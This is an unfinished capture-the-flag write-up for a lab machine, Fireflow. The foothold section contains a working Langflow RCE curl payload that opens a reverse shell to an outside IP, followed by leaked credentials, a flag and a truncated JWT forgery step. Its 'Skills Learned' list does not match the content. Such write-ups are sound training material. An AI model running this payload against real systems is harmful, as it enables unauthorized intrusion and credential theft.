# Synopsis
Fireflow is a medium difficulty Linux machine that starts off with a leaked Langflow flow_id. With this, an attacker is able to exploit the unauthenticated CVE-2026-33017 and get a shell as www-data on the remote machine.
There, he will find that a password in Langflow's .env file is reused by the user nightfall, who is able to SSH into the machine.
In the home directory of nightfall, a configuration file leaks sensitive information on how to connect to a custom MCP server. 
From there, it is discovered that an attacker can craft a malicious JWT token and impersonate an administrative user since the signing algorithms on the token also have the option None.
Then, they are able to register a custom malicious tool and get a shell on the MCP pod.
Enumerating the Kubernetes environment reveals that the nodes/proxy permission is set. This allows the attacker to execute arbitrary commands on privileged pods and eventually gain root on the host file system.


# Difficulty
**Medium**

# Skills Needed
- Port Scanning
- Enumeration
- Reading / Research

# Skills Learned 
- PyTorch Saving/loading models
- Exploiting Python's pickle

  
# Enumeration 

```
Nmap scan report for fireflow.htb (10.129.244.214)
Host is up (0.026s latency).
Not shown: 62762 closed tcp ports (reset), 2771 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp open  ssl/http nginx
|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Foothold
After checking the website we see the following 
<img width="924" height="587" alt="image" src="https://github.com/user-attachments/assets/96b00dd6-f348-4089-be3c-b72068732232" />
Clicking on the open agent button opens a chat box and gives us the flow UUID
**7d84d636-af65-42e4-ac38-26e867052c25**
from here we run the following command
```
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  -d '{
  "data": {
    "nodes": [{
      "id": "Exploit-001",
      "type": "genericNode",
      "position": {"x":0,"y":0},
      "data": {
        "id": "Exploit-001",
        "type": "ExploitComp",
        "node": {
          "template": {
            "code": {
              "type": "code",
              "required": true,
              "show": true,
              "multiline": true,
              "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.14.201/4444 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n  display_name=\"X\"\n  outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n  def r(self)->Data:\n    return Data(data={})",
              "name": "code",
              "password": false,
              "advanced": false,
              "dynamic": false
            },
            "_type": "Component"
          },
          "description": "X",
          "base_classes": ["Data"],
          "display_name": "ExploitComp",
          "name": "ExploitComp",
          "frozen": false,
          "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
          "field_order": ["code"],
          "beta": false,
          "edited": false
        }
      }
    }],
    "edges": []
  }
}'
```
Giving us a shell. From here we look around knowing we are dealing with a langflow box we head to /etc/langflow. We see there is a .env file, calling this we see the following
```
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```
Whilst also looking around I noticed there was a Nightfall user, cat/etc/passwd revealed the following
```
nightfall:x:1000:1000::/home/nightfall:/bin/bash
```
From here we have both a user and the superuser password. This may allow us to ssh.
```
ssh nightfall@fireflow.htb
# password: n1ghtm4r3_b4_n1ghtf4ll
```
From here we ls to see the user flag
**b6b45e7abf8de64d91e880f3179350a3**

Checking the files with ls -a I saw the directory .mcp looking in we see a config.json file
```
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```
from here we see if there is anything on the server for an MCP endpoint
```
nightfall@fireflow:~/.mcp$ curl -s http://10.129.244.214:30080/api/v1/version | python3 -m json.tool
```
We get the following output 
```
{
    "service": "MCP AI Tool Registry",
    "version": "0.1.0",
    "auth": {
        "type": "JWT",
        "header": "Authorization: Bearer <token>",
        "supported_algorithms": [
            "HS256",
            "none"
        ]
    },
    "docs": "/docs",
    "endpoints": [
        "POST /mcp                        [MCP JSON-RPC 2.0]",
        "POST /api/v1/auth",
        "GET  /api/v1/tools",
        "POST /api/v1/tools               [admin]"
    ]
```
 From here we try to get an access token
 ```
curl -s -X POST http://10.129.244.214:30080/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}

Heading to cyber chef to decrypt we get the following 
```
{"alg":"HS256","typ":"JWT"}{"sub":"langflow-bot","role":"user"}EéÆt{­¬£Â9hða"^ÇÀ®1)²ì
```
we focus on {"sub":"langflow-bot","role":"user"} 
Thinking how to get admin access we try to base64 encode {"sub":"person","role"


















# Notes
What is CVE-2026-33017? - An unauthenticated remote code execution (RCE) in the public flow build endpoint that allows attackers to execute arbitrary Python code on any exposed Langflow instance, 
with no credentials required and only a single HTTP request to get moving.
What is MCP - Model Context Protocol MCP servers are programs that expose specific capabilities to AI applications through standardized protocol interfaces.
